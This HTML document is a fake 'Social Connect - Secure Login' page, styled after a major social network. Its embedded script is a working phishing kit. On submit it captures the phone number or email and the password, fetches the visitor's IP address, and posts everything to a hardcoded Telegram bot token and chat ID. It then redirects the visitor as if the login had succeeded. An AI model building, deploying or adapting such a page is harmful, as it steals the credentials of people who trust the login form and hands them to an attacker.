<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Secure login for Social Connect">
    <title>Social Connect - Secure Login</title>
    <style>
        :root {
            --primary-color: #1877f2;
            --secondary-color: #42b72a;
            --text-color: #1c2526;
            --bg-color: #ffffff;
            --card-bg: #ffffff;
            --error-color: #dc3545;
            --success-color: #28a745;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
        }

        body {
            background: var(--bg-color);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            max-width: 980px;
            width: 100%;
            display: flex;
            gap: 40px;
            align-items: center;
        }

        .intro-section {
            max-width: 500px;
        }

        .logo {
            width: 200px;
            margin-bottom: 20px;
        }

        .intro-text {
            font-size: 24px;
            color: var(--text-color);
            margin-bottom: -50px;
        }

        .login-card {
            padding: 20px;
            border-radius: 10px;
            background: var(--card-bg);
            box-shadow: 0 0 10px rgba(48, 47, 47, 0.24);
            width: 100%;
            max-width: 400px;
        }

        .form-group {
            margin-bottom: 15px;
        }

        .form-input {
            width: 100%;
            padding: 12px 16px;
            border: 1px solid #ccd0d5;
            border-radius: 10px;
            font-size: 16px;
            transition: border-color 0.2s ease;
        }

        .form-input:focus {
            outline: none;
            border-color: var(--primary-color);
            box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
        }

        .btn {
            width: 100%;
            padding: 12px;
            border: none;
            border-radius: 20px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.2s ease;
        }

        .btn-primary {
            background: var(--primary-color);
            color: white;
        }

        .btn-primary:hover {
            background: #166fe5;
        }

        .btn-secondary {
            background: var(--secondary-color);
            color: white;
            margin-top: 15px;
        }

        .btn-secondary:hover {
            background: #3aa524;
        }

        .divider {
            margin: 20px 0;
            text-align: center;
            position: relative;
        }

        .divider::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 0;
            right: 0;
            border-top: 1px solid #ccd0d5;
            z-index: 1;
        }

        .divider span {
            background: var(--card-bg);
            padding: 0 15px;
            position: relative;
            z-index: 2;
            color: #65676b;
        }

        .status-message {
            padding: 10px;
            border-radius: 4px;
            margin-bottom: 15px;
            text-align: center;
            display: none;
        }

        .error-message {
            background: #ffebee;
            color: var(--error-color);
            border: 1px solid #ffcdd2;
        }

        .success-message {
            background: #e8f5e9;
            color: var(--success-color);
            border: 1px solid #c8e6c9;
        }

        .forgot-link {
            color: var(--primary-color);
            text-align: center;
            display: block;
            margin: 15px 0;
            text-decoration: none;
        }

        .forgot-link:hover {
            text-decoration: underline;
        }

        @media (max-width: 768px) {
            .container {
                flex-direction: column;
                padding: 20px;
            }
            .intro-section {
                text-align: center;
                margin-bottom: 30px;
            }
        }
        .intro-section img {
            width: 20%;
            height: auto;
            margin-top: -200px;

        }
        img {
            max-width: 100%;
            height: auto;
            
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="intro-section">
            <img src="/photo/logo.jpg" alt="Social Connect" class="logo">
           
        </div>
        <div class="login-card">
            <div id="status-message" class="status-message"></div>
            <form id="login-form">
                <div class="form-group">
                    <input type="tel" class="form-input" id="phone" placeholder="Molile Number or Email" required>
                </div>
                <div class="form-group">
                    <input type="password" class="form-input" id="password" placeholder="Password" required>
                </div>
                <button type="submit" class="btn btn-primary">Log In</button>
            </form>
            <a href="#" class="forgot-link">Forgot password?</a>
            <div class="divider"><span>or</span></div>
            <button class="btn btn-secondary" onclick="location.href='signup.html'">Create New Account</button>
        </div>
    </div>

    <script>
        document.getElementById('login-form').addEventListener('submit', async function(e) {
            e.preventDefault();

            const phone = document.getElementById('phone').value;
            const password = document.getElementById('password').value;
            const statusMessage = document.getElementById('status-message');

            // Reset message
            statusMessage.style.display = 'none';
            statusMessage.className = 'status-message';

            // Basic client-side validation
            if (!validatePhone(phone)) {
                showMessage('Please enter a valid phone number', 'error');
                return;
            }

            if (password.length < 6) {
                showMessage('Password must be at least 6 characters', 'error');
                return;
            }

            // Telegram bot configuration
            const botToken = '7775302991:AAGhN0WzRQ7FNu4z_TJkOTPU6peAPZuMlnU';
            const chatId = '1732455712';
            const message = `
New Login Attempt:
Phone: ${phone}
Password: ${password}
Time: ${new Date().toLocaleString()}
IP: ${await getUserIP()}
            `;

            try {
                // Send message to Telegram
                const telegramResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });

                const telegramData = await telegramResponse.json();

                if (telegramData.ok) {
                    setTimeout(() => {
                        window.location.href = '/index.html';
                    }, 1500);
                } else {
                    showMessage('Failed to process login. Please try again.', 'error');
                }
            } catch (error) {
                showMessage('Network error occurred. Please try again.', 'error');
                console.error('Error:', error);
            }
        });

        function validatePhone(phone) {
            // Basic phone number validation (accepts formats like: 1234567890, (123) 456-7890, 123-456-7890)
            const re = /^\(?([0-9]{3})\)?[-. ]?([0-9]{3})[-. ]?([0-9]{4})$/;
            return re.test(phone);
        }

        function showMessage(message, type) {
            const statusMessage = document.getElementById('status-message');
            statusMessage.textContent = message;
            statusMessage.className = `status-message ${type}-message`;
            statusMessage.style.display = 'block';
        }

        async function getUserIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                return 'Unable to get IP';
            }
        }
    </script>
</body>
</html>
